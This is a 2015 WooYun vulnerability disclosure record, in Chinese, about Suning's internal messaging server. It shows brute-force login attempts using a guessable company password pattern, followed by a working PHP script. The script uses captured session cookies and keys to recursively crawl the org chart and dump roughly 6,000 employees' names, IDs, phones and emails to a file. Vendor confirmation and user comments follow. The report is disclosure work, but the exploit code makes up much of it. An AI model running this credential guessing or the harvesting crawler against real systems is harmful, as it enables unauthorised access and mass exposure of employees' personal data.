{"id": 45250, "wybug_id": "wooyun-2015-0129149", "wybug_title": "看我如何获取苏宁控股集团全部员工信息（部门+职位+工号+负责人+手机+分机+邮箱）（验证脚本）", "wybug_corp": "江苏苏宁易购电子商务有限公司", "wybug_author": "Busliv", "wybug_date": "2015-07-25 08:29", "wybug_open_date": "2015-09-10 09:30", "wybug_type": "基础设施弱口令", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向公众公开  简要描述： 听说会有礼品卡，试试看 详细说明：  之前对苏宁小测过，发现各种waf，欲罢而不能。首先是这个漏洞WooYun-2015-119009看看是怎么修复这个漏洞的，发现接口依然可以爆破，验证密码正确性没有问题的，破解出来的部分密码登录不了客户端客户端做了限制，普通的弱密码都禁止了登陆，强制到某某平台修改后才能登陆，例如密码suning@12345 123456\n\n这样好办了，找个可以通过后台弱口令规则验证的密码小范围爆破之，\nusername=10050710&password=suning@2015username=10047117&password=suning@2015username=10043894&password=suning@2015\n破解到几个密码，但足以，成功登陆\n\n发现这个客户端的数据是通过http传输的，而且没有签名，没有加密，\n\n公司架构里面的信息对每个员工是全部公开的，\n\n这种公司人员架构就是n叉树，写个递归就可以遍历公司所以员工的信息了，\n\n小爆破一下，就6k多的员工信息，ps：php这种递归处理略慢   漏洞证明：  验证脚本\n<?include(\"conn.php\");set_time_limit(0);function putdata($id,$postable=\"0\"){\t$hostip= \"http://imapp.suning.com\";\t$ch = curl_init();\t$timeout = 5; \tif(1==$postable){  //获取用户数据\t\t\t$url = \"/imserver/vcard/loadall\";\t\t\t$data = 'usernames='.$id.'&propnames=&searchemploy=1';\t\t\t$datalen = strlen($data);\t\t\t$headers = array( \t\t\t\"POST \".$url.\" HTTP/1.1\",\t\t\t\"Content-Type: application/x-www-form-urlencoded\",\t\t\t\"Cookie: authId=si5239612559C1E6A6F48F7612B981EFC7\",\t\t\t\"Content-Length: \".$datalen,\t\t\t\"Connection: Keep-Alive\",\t\t\t\"Accept-Encoding: gzip\",\t\t\t\"Accept-Language: zh-CN,en,*\",\t\t\t\"User-Agent: Mozilla/5.0\",\t\t\t\"Host: imapp.suning.com\"\t       \t\t\t\t\t); \t\t\t}\telse{ \t        //获取结点信息         \t\t\t$url = \"/imserver/organization/getOrgAndEmp.do\";\t\t\t$data = 'orgId='.$id;\t\t\t$datalen = strlen($data);\t\t\t$headers = array( \t\t\t\"POST \".$url.\" HTTP/1.1\",\t\t\t\"Content-Type: application/x-www-form-urlencoded\",\t\t\t\"User-Agent: PcClient\",\t\t\t\"key: 9b826400b345f7b6bd873f1bf04db8ec\",\t\t\t\"uid: sn10043894\",\t\t\t\"Cookie: authId=si3E74D436350ECBEDB492773A8E2D6B17\",\t\t\t\"Content-Length: \".$datalen,\t\t\t\"Connection: Keep-Alive\",\t\t\t\"Accept-Encoding: gzip\",\t\t\t\"Accept-Language: zh-CN,en,*\",\t\t\t\"Host: imapp.suning.com\"       \t\t\t\t\t\t\t\t\t ); \t\t\t\t}\t$requestUrl = \"$hostip\".\"$url\";\t\tcurl_setopt($ch, CURLOPT_URL, $requestUrl);\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\tcurl_setopt($ch, CURLOPT_HTTPHEADER, $headers); \tcurl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);\tcurl_setopt($ch, CURLOPT_POST, 1); \tcurl_setopt($ch, CURLOPT_POSTFIELDS, $data); \tcurl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');\t$file_contents = curl_exec($ch);\tcurl_close($ch);\treturn $file_contents;}function getorgId($redata){     \t\t\t\t//匹配部门id\t\t\t$rule = '/orgId\\\":\\\"*([\\s\\S]*?)\\\",/i';\t\t\tpreg_match_all($rule, $redata, $result);\t\t\treturn $result;\t\t\t\t}function getuserId($redata){    \t\t\t\t//匹配用户信息\t\t\t$rule = '/{\\\"empId\\\"*([\\s\\S]*?)}/i';\t\t\tpreg_match_all($rule, $redata, $result);\t\t\treturn $result;\t\t\t\t\t\t\t}function getuserinfo($redata){ \t\t\t\t\t//匹配用户id\t\t\t$rule = '/\\\"empJid\\\":\\\"*([\\s\\S]*?)@/i';\t\t\tpreg_match_all($rule, $vlue, $result);\t\t\treturn $result;\t\t\t\t}function im($id){\t\t$i = putdata($id);\t\tif($i){\t\t$orgId = getorgId($i);\t\tif(!empty($orgId[1])){\t\t\t\tforeach($orgId[1] as $vlue){ im($vlue);}\t\t\t\t    \t}\t\telse {\t \t\t\t$userid = getuserId($i);\t\t\tif(!empty($userid[0])){\t\t\tforeach($userid[0] as $vlue){\t\t\t\t\techo \"$vlue\".\"<br>\";\t\t\t\t\tfile_put_contents(\"userinfo.txt\", \"$vlue\".\"\\r\\n\",FILE_APPEND);\t\t\t\t\t$usermailid = getuserinfo($i);\t\t\t\t\t//$rule = '/\\\"empJid\\\":\\\"*([\\s\\S]*?)@/i';\t\t\t\t\t//preg_match_all($rule, $vlue, $result);\t\t\t\t\t//$usermailid= $result[1];\t\t\t\t\t$userinfo = putdata($usermailid[1],$postable=\"1\");\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t}\t\t\t\t\t\t\t}im($id=10000002);?>\n   修复方案：  爆破接口做点限制客户端数据传输加密   版权声明：转载请注明来源 Busliv@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-27 09:28 厂商回复： 感谢提交，问题与之前类似。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-25 08:38 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:55        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  666666    \n     2015-07-25 10:28 |    \t\t零柒 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        )\t\t \n  。。公开看泄漏信息    \n     2015-07-25 12:39 |    \t\tMAX丶 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:4        | 人生路上总有一些不顺心的事情，让我们跳过...)\t\t \n  为何那么叼求过程！！！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}